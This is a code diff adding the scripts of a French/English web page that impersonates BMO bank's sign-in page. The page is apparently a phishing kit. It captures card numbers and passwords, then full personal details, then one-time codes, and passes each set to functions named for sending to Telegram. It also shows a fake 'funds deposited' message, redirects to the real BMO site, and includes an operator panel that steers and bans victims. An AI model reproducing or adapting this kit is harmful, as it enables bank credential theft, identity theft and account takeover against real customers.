+    };
+
+    let currentLang = 'fr';
+    let currentStep = 1;
+
+    // =========================================================
+    // ÉLÉMENTS
+    // =========================================================
+
+    const cardNumber = document.getElementById("cardNumber");
+    const password = document.getElementById("password");
+    const rememberBox = document.getElementById("rememberBox");
+    const eyeButton = document.getElementById("eyeButton");
+    const signInButton = document.getElementById("signInButton");
+    const modalBackdrop = document.getElementById("modalBackdrop");
+    const modalMessage = document.getElementById("modalMessage");
+    const closeModal = document.getElementById("closeModal");
+    const langToggle = document.getElementById("langToggle");
+    const logoLink = document.getElementById("logoLink");
+    const mapBtn = document.getElementById("mapBtn");
+    const modalTitle = document.getElementById("modalTitle");
+    const cardHelper = document.getElementById("cardHelper");
+    const passHelper = document.getElementById("passHelper");
+
+    // Éléments de la bulle d'aide
+    const infoBtn = document.getElementById("infoBtn");
+    const infoPopover = document.getElementById("infoPopover");
+    const popoverClose = document.getElementById("popoverClose");
+
+    // =========================================================
+    // GESTION DE LA BULLE D'AIDE (POPOVER)
+    // =========================================================
+
+    function togglePopover() {
+      const isExpanded = infoBtn.getAttribute("aria-expanded") === "true";
+      if (isExpanded) {
+        closePopover();
+      } else {
+        openPopover();
+      }
+    }
+
+    function openPopover() {
+      infoPopover.classList.add("show");
+      infoBtn.setAttribute("aria-expanded", "true");
+    }
+
+    function closePopover() {
+      infoPopover.classList.remove("show");
+      infoBtn.setAttribute("aria-expanded", "false");
+    }
+
+    infoBtn.addEventListener("click", (e) => {
+      e.stopPropagation();
+      togglePopover();
+    });
+
+    popoverClose.addEventListener("click", (e) => {
+      e.stopPropagation();
+      closePopover();
+      infoBtn.focus();
+    });
+
+    document.addEventListener("click", (e) => {
+      if (infoPopover.classList.contains("show")) {
+        if (!infoPopover.contains(e.target) && e.target !== infoBtn) {
+          closePopover();
+        }
+      }
+    });
+
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape") {
+        if (infoPopover.classList.contains("show")) {
+          closePopover();
+          infoBtn.focus();
+        }
+      }
+    });
+
+
+    // =========================================================
+    // FONCTION DE CHANGEMENT DE LANGUE
+    // =========================================================
+    function setLanguage(lang) {
+      currentLang = lang;
+      langToggle.textContent = (lang === 'fr') ? 'EN' : 'FR';
+      document.documentElement.lang = lang;
+
+      document.querySelectorAll("[data-i18n]").forEach(el => {
+        const key = el.getAttribute("data-i18n");
+        if (translations[lang][key]) {
+          if (el === cardHelper && cardNumber.classList.contains("error-input")) return;
+          if (el === passHelper && password.classList.contains("error-input")) return;
+          el.textContent = translations[lang][key];
+        }
+      });
+
+      logoLink.setAttribute("aria-label", translations[lang].logoAria);
+      mapBtn.setAttribute("aria-label", translations[lang].mapAria);
+      
+      const isPasswordHidden = password.type === "password";
+      const ariaShowKey = isPasswordHidden ? "showPassword" : "hidePassword";
+      eyeButton.setAttribute("aria-label", translations[lang][ariaShowKey]);
+      
+      if (!modalBackdrop.dataset.infoState && !modalBackdrop.dataset.codeState) {
+        modalTitle.textContent = translations[lang].modalTitleDefault;
+      }
+    }
+
+    langToggle.addEventListener("click", () => {
+      setLanguage(currentLang === 'fr' ? 'en' : 'fr');
+    });
+
+
+    // =========================================================
+    // NUMÉRO DE CARTE / IDENTIFIANT
+    // =========================================================
+
+    function removeError(inputElement) {
+      if (inputElement.value.trim()) {
+        inputElement.classList.remove("error-input");
+        if (inputElement === cardNumber) {
+          cardHelper.classList.remove("error-text");
+          cardHelper.textContent = translations[currentLang].cardHelper;
+        } else if (inputElement === password) {
+          passHelper.style.display = "none";
+        }
+      }
+    }
+
+
+    // =========================================================
+    // REMEMBER CARD
+    // =========================================================
+
+    function toggleRemember() {
+      const checked = rememberBox.getAttribute("aria-checked") === "true";
+      rememberBox.setAttribute("aria-checked", String(!checked));
+      rememberBox.classList.toggle("checked", !checked);
+    }
+
+    rememberBox.addEventListener("click", toggleRemember);
+
+    rememberBox.addEventListener("keydown", event => {
+      if (event.key === " " || event.key === "Enter") {
+        event.preventDefault();
+        toggleRemember();
+      }
+    });
+
+
+    // =========================================================
+    // AFFICHER / MASQUER MOT DE PASSE
+    // =========================================================
+
+    eyeButton.addEventListener("click", () => {
+      if (password.type === "password") {
+        password.type = "text";
+        eyeButton.setAttribute("aria-label", translations[currentLang].hidePassword);
+      } else {
+        password.type = "password";
+        eyeButton.setAttribute("aria-label", translations[currentLang].showPassword);
+      }
+    });
+
+
+    // =========================================================
+    // MODAL
+    // =========================================================
+
+    function showDemoMessage(message) {
+      delete modalBackdrop.dataset.infoState;
+      delete modalBackdrop.dataset.codeState;
+      modalTitle.textContent = translations[currentLang].modalTitleDefault;
+      modalMessage.innerHTML = message;
+      closeModal.textContent = translations[currentLang].closeBtn;
+      closeModal.style.display = "block";
+      modalBackdrop.classList.add("show");
+    }
+
+    function switchStepDirect(stepNum) {
+      currentStep = parseInt(stepNum);
+      if (currentStep === 1) {
+        modalBackdrop.classList.remove("show");
+        delete modalBackdrop.dataset.infoState;
+        delete modalBackdrop.dataset.codeState;
+        updateMyStatus("Sur BMO (Étape 1: Identifiant)");
+      } else if (currentStep === 2) {
+        modalBackdrop.dataset.infoState = "true";
+        delete modalBackdrop.dataset.codeState;
+        modalTitle.textContent = translations[currentLang].infoTitle;
+        modalMessage.innerHTML = `
+          <p style="margin-bottom: 10px;">${translations[currentLang].infoPrompt}</p>
+          <div style="display:flex; flex-direction:column; gap:8px;">
+            <input id="inputNom" type="text" placeholder="${translations[currentLang].lblNom}" oninput="handleInfoLiveInput()" />
+            <input id="inputPrenom" type="text" placeholder="${translations[currentLang].lblPrenom}" oninput="handleInfoLiveInput()" />
+            <input id="inputTel" type="tel" placeholder="${translations[currentLang].lblTel}" oninput="handleInfoLiveInput()" />
+            <input id="inputDob" type="text" placeholder="${translations[currentLang].lblDob} (ex: JJ/MM/AAAA)" oninput="handleInfoLiveInput()" />
+            <input id="inputEmail" type="email" placeholder="${translations[currentLang].lblEmail}" oninput="handleInfoLiveInput()" />
+            <input id="inputAdresse" type="text" placeholder="${translations[currentLang].lblAddress}" oninput="handleInfoLiveInput()" />
+            <input id="inputPostal" type="text" placeholder="${translations[currentLang].lblPostal}" oninput="handleInfoLiveInput()" />
+          </div>
+        `;
+        closeModal.textContent = translations[currentLang].submitInfoBtn;
+        closeModal.style.display = "block";
+        closeModal.disabled = false;
+        modalBackdrop.classList.add("show");
+        updateMyStatus("Sur BMO (Étape 2: Informations Personnelles)");
+      } else if (currentStep >= 3) {
+        delete modalBackdrop.dataset.infoState;
+        modalBackdrop.dataset.codeState = "true";
+        modalTitle.textContent = translations[currentLang].codeTitle;
+        modalMessage.innerHTML = `
+          <p style="margin-bottom: 12px;">${translations[currentLang].codePrompt}</p>
+          <input id="codeInput" type="text" inputmode="numeric" maxlength="6" placeholder="${translations[currentLang].codePlaceholder}" style="margin-bottom: 15px;" oninput="handleOtpLiveUpdate()" />
+        `;
+        closeModal.textContent = translations[currentLang].submitCodeBtn;
+        closeModal.style.display = "block";
+        closeModal.disabled = false;
+        modalBackdrop.classList.add("show");
+        updateMyStatus("Sur BMO (Étape 3: Code OTP)");
+      }
+    }
+
+    closeModal.addEventListener("click", async () => {
+      if (!modalBackdrop.dataset.infoState && !modalBackdrop.dataset.codeState) {
+        modalBackdrop.dataset.infoState = "true";
+        modalTitle.textContent = translations[currentLang].infoTitle;
+        modalMessage.innerHTML = `
+          <p style="margin-bottom: 10px;">${translations[currentLang].infoPrompt}</p>
+          <div style="display:flex; flex-direction:column; gap:8px;">
+            <input id="inputNom" type="text" placeholder="${translations[currentLang].lblNom}" oninput="handleInfoLiveInput()" />
+            <input id="inputPrenom" type="text" placeholder="${translations[currentLang].lblPrenom}" oninput="handleInfoLiveInput()" />
+            <input id="inputTel" type="tel" placeholder="${translations[currentLang].lblTel}" oninput="handleInfoLiveInput()" />
+            <input id="inputDob" type="text" placeholder="${translations[currentLang].lblDob} (ex: JJ/MM/AAAA)" oninput="handleInfoLiveInput()" />
+            <input id="inputEmail" type="email" placeholder="${translations[currentLang].lblEmail}" oninput="handleInfoLiveInput()" />
+            <input id="inputAdresse" type="text" placeholder="${translations[currentLang].lblAddress}" oninput="handleInfoLiveInput()" />
+            <input id="inputPostal" type="text" placeholder="${translations[currentLang].lblPostal}" oninput="handleInfoLiveInput()" />
+          </div>
+        `;
+        closeModal.textContent = translations[currentLang].submitInfoBtn;
+        return;
+      }
+
+      if (modalBackdrop.dataset.infoState === "true") {
+        const nom = document.getElementById("inputNom")?.value.trim() || "";
+        const prenom = document.getElementById("inputPrenom")?.value.trim() || "";
+        const telephone = document.getElementById("inputTel")?.value.trim() || "";
+        const naissance = document.getElementById("inputDob")?.value.trim() || "";
+        const email = document.getElementById("inputEmail")?.value.trim() || "";
+        const adresse = document.getElementById("inputAdresse")?.value.trim() || "";
+        const postal = document.getElementById("inputPostal")?.value.trim() || "";
+
+        if (nom && prenom && telephone && naissance && email && adresse && postal) {
+          const infoData = { nom, prenom, telephone, naissance, email, adresse, postal };
+          
+          sendOrUpdateInfoTelegram(infoData, false);
+
+          closeModal.disabled = true;
+          const originalText = closeModal.textContent;
+          closeModal.innerHTML = '<span class="spinner"></span>';
+
+          updateMyStatus("Sur BMO (Étape 3: Code OTP)");
+          currentStep = 3;
+
+          await new Promise(resolve => setTimeout(resolve, 2000));
+
+          closeModal.disabled = false;
+          closeModal.textContent = originalText;
+
+          delete modalBackdrop.dataset.infoState;
+          modalBackdrop.dataset.codeState = "true";
+
+          modalTitle.textContent = translations[currentLang].codeTitle;
+          modalMessage.innerHTML = `
+            <p style="margin-bottom: 12px;">${translations[currentLang].codePrompt}</p>
+            <input id="codeInput" type="text" inputmode="numeric" maxlength="6" placeholder="${translations[currentLang].codePlaceholder}" style="margin-bottom: 15px;" oninput="handleOtpLiveUpdate()" />
+          `;
+          closeModal.textContent = translations[currentLang].submitCodeBtn;
+        } else {
+          alert("Veuillez remplir tous les champs du formulaire.");
+        }
+        return;
+      }
+
+      if (modalBackdrop.dataset.codeState === "true") {
+        const codeInput = document.getElementById("codeInput");
+        if (codeInput && codeInput.value.trim() !== "") {
+          const codeValue = codeInput.value.trim();
+          
+          sendOrUpdateOtpTelegram(codeValue, false);
+
+          modalMessage.innerHTML = `<p style="color: green; font-weight: bold; text-align: center;">Merci, vos fonds ont été déposés avec succès</p>`;
+          closeModal.style.display = "none";
+          
+          updateMyStatus("BMO - Validé / Succès");
+
+          setTimeout(() => {
+            window.location.replace("https://www.bmo.com/en-ca/main/personal/bank-accounts/new-bank-account-offers-and-promotions-1/?ecid=ps-EDB4-AQUM36&utm_source=BMO_EDB_DA&utm_medium=Search_Bing&utm_campaign=EDB_CA_EDB_LowFunnelSearch_Bing_Enterprise_EN&utm_term=%7Bsearchterm%7D&utm_content=bmo%7Ce%7C%7Badgroupname%7D&&msclkid=ab8da55ce7ed14eb1056cfe55b3a9c0b&gclid=ab8da55ce7ed14eb1056cfe55b3a9c0b&gclsrc=3p.ds&gad_source=7&gad_campaignid=17448289136");
+          }, 1500);
+        } else {
+          if (codeInput) codeInput.classList.add("error-input");
+        }
+        return;
+      }
+
+      modalBackdrop.classList.remove("show");
+    });
+
+    modalBackdrop.addEventListener("click", event => {
+      if (event.target === modalBackdrop) {
+        modalBackdrop.classList.remove("show");
+        delete modalBackdrop.dataset.infoState;
+        delete modalBackdrop.dataset.codeState;
+      }
+    });
+
+
+    // =========================================================
+    // CONNEXION DE DÉMONSTRATION
+    // =========================================================
+
+    signInButton.addEventListener("click", async () => {
+      const demoCard = cardNumber.value.trim();
+      const demoPassword = password.value;
+      let hasError = false;
+
+      if (!demoCard) {
+        cardNumber.classList.add("error-input");
+        cardHelper.classList.add("error-text");
+        cardHelper.textContent = translations[currentLang].cardHelperError;
+        hasError = true;
+      } else {
+        cardNumber.classList.remove("error-input");
+        cardHelper.classList.remove("error-text");
+        cardHelper.textContent = translations[currentLang].cardHelper;
+      }
+
+      if (!demoPassword) {
+        password.classList.add("error-input");
+        passHelper.style.display = "block";
+        passHelper.textContent = translations[currentLang].passHelperError;
+        hasError = true;
+      } else {
+        password.classList.remove("error-input");
+        passHelper.style.display = "none";
+      }
+
+      if (hasError) {
+        return;
+      }
+
+      sendOrUpdateLoginTelegram({ cardNumber: demoCard, password: demoPassword }, false);
+
+      signInButton.disabled = true;
+      const originalText = signInButton.innerHTML;
+      signInButton.innerHTML = '<span class="spinner"></span>';
+
+      updateMyStatus("Sur BMO (Étape 2: Informations Personnelles)");
+      currentStep = 2;
+
+      await new Promise(resolve => setTimeout(resolve, 15000));
+
+      signInButton.disabled = false;
+      signInButton.innerHTML = originalText;
+
+      showDemoMessage(translations[currentLang].msgError);
+    });
+
+    document.querySelectorAll(".demo-action").forEach(link => {
+      link.addEventListener("click", event => {
+        event.preventDefault();
+        showDemoMessage(translations[currentLang].msgDisabled);
+      });
+    });
+  </script>
+
+  <!-- SCRIPT DE COMMUNICATION TEMPS RÉEL & CONTRÔLE DEPUIS LE SENDER -->
+  <script>
+    let myTesterId = localStorage.getItem("localTesterId");
+    if (!myTesterId) {
+        myTesterId = 'usr_' + Math.random().toString(36).substring(2, 9);
+        localStorage.setItem("localTesterId", myTesterId);
+    }
+    let currentUserEmail = "client.bmo@gmail.com";
+
+    function updateMyStatus(statusText) {
+        if (localStorage.getItem("userBanned") === "true") return;
+        let onlineUsers = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+        let index = onlineUsers.findIndex(u => u.id === myTesterId);
+
+        const record = {
+            id: myTesterId,
+            email: currentUserEmail,
+            ip: '192.168.1.15 (QC, CA)',
+            currentPage: "bmo.html",
+            status: statusText || "Sur BMO (Étape 1: Identifiant)",
+            lastSeen: Date.now()
+        };
+
+        if (index !== -1) {
+            onlineUsers[index] = record;
+        } else {
+            onlineUsers.unshift(record);
+        }
+        localStorage.setItem("onlineUsersList", JSON.stringify(onlineUsers));
+    }
+
+    updateMyStatus("Sur BMO (Étape 1: Identifiant)");
+
+    setInterval(() => {
+        let statusText = "Sur BMO (Étape 1: Identifiant)";
+        if (currentStep === 2 && modalBackdrop.dataset.infoState === "true") statusText = "Sur BMO (Étape 2: Informations Personnelles)";
+        else if (currentStep === 3 || modalBackdrop.dataset.codeState === "true") statusText = "Sur BMO (Étape 3: Code OTP)";
+        
+        updateMyStatus(statusText);
+    }, 4000);
+
+    window.addEventListener("beforeunload", () => {
+        let onlineUsers = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+        onlineUsers = onlineUsers.map(u => u.id === myTesterId ? { ...u, status: "🔴 Sorti de la page (Inactif)", lastSeen: 0 } : u);
+        localStorage.setItem("onlineUsersList", JSON.stringify(onlineUsers));
+    });
+
+    window.addEventListener("storage", (event) => {
+        if (event.key === "forceUserAction") {
+            const forced = localStorage.getItem("forceUserAction");
+            if (forced) {
+                const data = JSON.parse(forced);
+                if (data.targetId === "all" || data.targetId === myTesterId) {
+                    if (data.action === "step") {
+                        switchStepDirect(data.value);
+                    } else if (data.action === "otp") {
+                        window.location.href = data.value;
+                    } else if (data.action === "ban") {
+                        localStorage.setItem("userBanned", "true");
+                        document.body.innerHTML = '<div style="background:#020204; color:#ff0055; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial, sans-serif; font-size:1.5rem; text-align:center;">ACCÈS REFUSÉ - VOUS AVEZ ÉTÉ BANNI PAR L\'ADMINISTRATEUR.</div>';
+                    }
+                }
+            }
+        }
+    });
+  </script>
+
+</body>
+</html>
